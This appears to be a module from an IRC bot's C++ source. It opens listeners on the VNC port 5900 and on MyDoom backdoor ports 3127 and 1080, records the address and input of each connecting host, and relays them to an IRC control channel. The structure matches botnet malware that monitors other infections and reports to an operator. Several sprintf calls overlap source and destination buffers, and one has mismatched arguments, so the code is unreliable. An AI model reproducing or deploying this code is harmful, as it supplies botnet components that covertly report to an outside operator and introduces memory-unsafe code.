#include "Include.h"
#include "Hell.h"

DWORD WINAPI VNCHONEYPOT(LPVOID param)
{
	char user[12], buffer[1024];
	BOOL success = FALSE;
	SOCKET ssock,csock;
	
	SOCKADDR_IN ssin, csin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons((unsigned short)5900);
	ssin.sin_addr.s_addr=INADDR_ANY;
	
	if ((ssock = socket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		if (bind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (listen(ssock, 5) != SOCKET_ERROR) {
				int csin_len = sizeof(csin);
				
				while (1) {
					if ((csock = accept(ssock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
						break;
					
					sprintf(buffer, "-HoneyPot.cpp- HoneyPot:: Client connection from IP: %s:%d.", inet_ntoa(csin.sin_addr), csin.sin_port);
				    BOT->cIRC.SendData("PRIVMSG %s :-HoneyPot.cpp- HoneyPot:: [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),buffer);
					if (recv(csock,buffer,sizeof(buffer),0) != SOCKET_ERROR) {
						Split(buffer,0);
						memset(user, 0, sizeof(user));
						sprintf(buffer, "-HoneyPot.cpp- HoneyPot:: [%s].", inet_ntoa(csin.sin_addr), csin.sin_port);
						sprintf(buffer, "-HoneyPot.cpp- HoneyPot:: [%s].", buffer);
                        BOT->cIRC.SendData("PRIVMSG %s :-HoneyPot.cpp- HoneyPot:: [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),buffer);
						if (send(csock,buffer,strlen(buffer),0) != SOCKET_ERROR)
							success = TRUE;
						
					}
				}
			}
		}
	}
	
	if (!success) {
		sprintf(buffer, "-HoneyPot.cpp- HoneyPot:: Error: server failed, returned: <%d>.", WSAGetLastError());
		BOT->cIRC.SendData("PRIVMSG %s :-HoneyPot.cpp- HoneyPot:: [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),buffer);
	}
	closesocket(ssock);
	closesocket(csock);
	ExitThread(0);
	return 0;
}


DWORD WINAPI MYDOOM(LPVOID param)
{
	char user[12], buffer[1024];
	BOOL success = FALSE;
	SOCKET ssock,csock;
	
	SOCKADDR_IN ssin, csin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons((unsigned short)3127);
	ssin.sin_addr.s_addr=INADDR_ANY;
	
	if ((ssock = socket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		if (bind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (listen(ssock, 5) != SOCKET_ERROR) {
				int csin_len = sizeof(csin);
				
				while (1) {
					if ((csock = accept(ssock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
						break;
					
					sprintf(buffer, "-HoneyPot.cpp- HoneyPot:: (MyDoom port 3127) Client connection from IP: %s:%d.", inet_ntoa(csin.sin_addr), csin.sin_port);
						sprintf(buffer, "-HoneyPot.cpp- HoneyPot:: [%s].", buffer);
					BOT->cIRC.SendData("PRIVMSG %s :-HoneyPot.cpp- HoneyPot:: [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),buffer);
					if (recv(csock,buffer,sizeof(buffer),0) != SOCKET_ERROR) {
						Split(buffer,0);
						memset(user, 0, sizeof(user));
						BOT->cIRC.SendData("PRIVMSG %s :-HoneyPot.cpp- HoneyPot:: [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),buffer);
							sprintf(buffer, "-HoneyPot.cpp- HoneyPot:: [%s].", buffer);
						if (send(csock,buffer,strlen(buffer),0) != SOCKET_ERROR)
							success = TRUE;
						
					}
				}
			}
		}
	}
	
	if (!success) {
		sprintf(buffer, "-HoneyPot.cpp- HoneyPot:: Error: server failed, returned: <%d>.", WSAGetLastError());
		BOT->cIRC.SendData("PRIVMSG %s :-HoneyPot.cpp- HoneyPot:: [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),buffer);
	}
	closesocket(ssock);
	closesocket(csock);
	ExitThread(0);
	return 0;
}

DWORD WINAPI MYDOOM2(LPVOID param)
{
	char user[12], buffer[1024];
	BOOL success = FALSE;
	SOCKET ssock,csock;
	
	SOCKADDR_IN ssin, csin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons((unsigned short)1080);
	ssin.sin_addr.s_addr=INADDR_ANY;
	
	if ((ssock = socket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		if (bind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (listen(ssock, 5) != SOCKET_ERROR) {
				int csin_len = sizeof(csin);
				
				while (1) {
					if ((csock = accept(ssock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
						break;
					
					sprintf(buffer, "-HoneyPot.cpp- HoneyPot:: (MyDoom port 1080) Client connection from IP: %s:%d.", inet_ntoa(csin.sin_addr), csin.sin_port);
					sprintf(buffer, "-HoneyPot.cpp- HoneyPot:: [%s].", buffer);
					BOT->cIRC.SendData("PRIVMSG %s :-HoneyPot.cpp- HoneyPot:: [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),buffer);
					if (recv(csock,buffer,sizeof(buffer),0) != SOCKET_ERROR) {
						Split(buffer,0);
						memset(user, 0, sizeof(user));
						sprintf(buffer, "-HoneyPot.cpp- HoneyPot:: [%s].", buffer);
						BOT->cIRC.SendData("PRIVMSG %s :-HoneyPot.cpp- HoneyPot:: [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),buffer);
						if (send(csock,buffer,strlen(buffer),0) != SOCKET_ERROR)
							success = TRUE;
						
					}
				}
			}
		}
	}
	
	if (!success) {
		sprintf(buffer, "-HoneyPot.cpp- HoneyPot:: Error: server failed, returned: <%d>.", WSAGetLastError());
		BOT->cIRC.SendData("PRIVMSG %s :-HoneyPot.cpp- HoneyPot:: [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),buffer);
	}
	closesocket(ssock);
	closesocket(csock);
	ExitThread(0);
	return 0;
}